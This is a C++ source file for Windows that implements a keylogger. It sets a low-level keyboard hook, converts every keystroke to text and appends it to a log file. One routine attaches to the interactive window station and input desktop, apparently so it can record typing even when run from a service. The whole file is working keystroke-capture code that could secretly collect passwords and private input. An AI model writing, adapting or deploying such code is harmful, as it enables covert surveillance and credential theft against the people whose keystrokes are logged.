/*
* Author: thirdstormofcythraul@outlook.com
*/
#include "keylogger.h"

#include <Windows.h>

#include "cprocess.h"
#include "macro.h"

std::wstring Keylogger::filename;

HANDLE Keylogger::hThread = 0;

// Global instance du hook
HHOOK hKeyHook;

// Gestion du hook
__declspec(dllexport) LRESULT CALLBACK KeyEvent (int nCode, WPARAM wParam, LPARAM lParam ) {

	// Action du clavier et les touches tappées
	if  ((nCode == HC_ACTION) && (wParam == WM_KEYDOWN)) {

		// conversion du code -> ascii 
		BYTE KeyState[256];
		WORD wBuf;
		char ch;

		// Structure pour récupération des informations
		KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);

		/* Traitement récupération dec codes des touches */

		// Etat du clavier
		GetKeyboardState(KeyState);

		// Conversion code > ascii
		ToAscii(hooked.vkCode, hooked.scanCode, KeyState, &wBuf, 0);

		FILE * pFile = 0;
		errno_t err;
		if((err = _wfopen_s(&pFile, Keylogger::filename.c_str(), L"a")) != 0 ) {
			MYPRINTF("Can't open file !\n");
		} else {

			//on rajoute les touches non traitées par le hook
			switch(hooked.vkCode){
			case 9 :{
				fprintf(pFile, "<TAB>");
				break;
					}
			case 13 :{
				fprintf(pFile, "<ENTER>");
				break;
					 }
			case VK_BACK :{
				fprintf(pFile, "<delete>");
				break;
						  }
			case VK_DELETE: {
				fprintf(pFile, "<Suppr>");
				break;
							}
			default : {
				ch = ((char)wBuf); 
				fprintf(pFile, "%c", ch);
				break;
					  }
			}
			fclose(pFile);
		}

	}
	// Renvoi des messages au sytème
	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}


// Boucle des messages 
void Keylogger::msgLoop()
{
	MSG message;
	while (GetMessage(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD WINAPI Keylogger::keyLogger2(LPVOID lpParameter)
{

	bool result = false;

	// open the WinSta0 as some services are attached to a different window station.
	HWINSTA hWindowStation = OpenWindowStation(TEXT("WinSta0"), FALSE, WINSTA_ALL_ACCESS);
	if (!hWindowStation){
		if(RevertToSelf())
			hWindowStation = OpenWindowStation(TEXT("WinSta0"), FALSE, WINSTA_ALL_ACCESS);
	}

	// if we cant open the defaut input station we wont be able to take a screenshot
	if (!hWindowStation){
		MYPRINTF("[SCREENSHOT] screenshot: Couldnt get the WinSta0 Window Station (%d)\n", GetLastError());
		return false;
	}

	// get the current process's window station so we can restore it later on.
	HWINSTA hOrigWindowStation = GetProcessWindowStation();

	// set the host process's window station to this sessions default input station we opened
	if (!SetProcessWindowStation(hWindowStation)){
		MYPRINTF( "[SCREENSHOT] screenshot: SetProcessWindowStation failed (%d)\n", GetLastError());
		return false;
	}

	// grab a handle to the default input desktop (e.g. Default or WinLogon)

	HDESK hInputDesktop = OpenInputDesktop(0, FALSE, MAXIMUM_ALLOWED);
	if (!hInputDesktop){
		MYPRINTF( "[SCREENSHOT] screenshot: OpenInputDesktop failed (%d)\n", GetLastError());
		return false;
	}

	// get the threads current desktop so we can restore it later on
	HDESK hOrigDesktop = GetThreadDesktop(GetCurrentThreadId());

	// set this threads desktop to that of this sessions default input desktop on WinSta0
	if (!SetThreadDesktop(hInputDesktop)){
		int error  =GetLastError();
		MYPRINTF( "[SCREENSHOT] screenshot: SetThreadDesktop failed (%d)\n", error);
		if (error != 170){
			return false;
		}
	}

	HINSTANCE hExe = GetModuleHandle(0);

	if (!hExe){
		MYPRINTF("GetWindowLong error (%d)\n", GetLastError());
		return false;
	}

	// on demarre le hook
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, hExe, NULL);
	if (hKeyHook == 0) {
		MYPRINTF("SetWindowsHookEx error (%d)\n", GetLastError());
		return false;
	}

	// Boucle des messages
	msgLoop();

	// on desactive le hook
	if (UnhookWindowsHookEx(hKeyHook) == 0){
		MYPRINTF("UnhookWindowsHookExg error\n");
	}

	// restore the origional process's window station
	if (hOrigWindowStation)
		SetProcessWindowStation(hOrigWindowStation);

	// restore the threads origional desktop
	if (hOrigDesktop)
		SetThreadDesktop(hOrigDesktop);

	// close the WinSta0 window station handle we opened
	if (hWindowStation)
		CloseWindowStation(hWindowStation);

	// close this last to avoid a handle leak...
	if (hInputDesktop)
		CloseDesktop(hInputDesktop);

	return result;
}

DWORD WINAPI Keylogger::keyLogger(LPVOID lpParameter)
{
	// Récuperation de l'instance de notre executable
	HINSTANCE hExe = GetModuleHandle(0);

	if (!hExe){
		MYPRINTF("GetWindowLong error (%d)\n", GetLastError());
		return 1;
	}

	// on demarre le hook
	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, hExe, NULL);
	if (hKeyHook == 0) {
		MYPRINTF("SetWindowsHookEx error (%d)\n", GetLastError());
		return 1;
	}

	// Boucle des messages
	msgLoop();

	// on desactive le hook
	if (UnhookWindowsHookEx(hKeyHook) == 0){
		MYPRINTF("UnhookWindowsHookExg error\n");
	}

	return 0;
}

bool Keylogger::startKeylogger(const wchar_t *filename){
	Keylogger::filename = filename;

	DWORD dwThread;

	Keylogger::hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) keyLogger2, (LPVOID)0, 0, &dwThread);

	return true;
}

bool Keylogger::stopKeylogger(){
	if (Keylogger::hThread == 0){
		return false;
	}
	return TerminateThread(Keylogger::hThread, 1) != 0;
}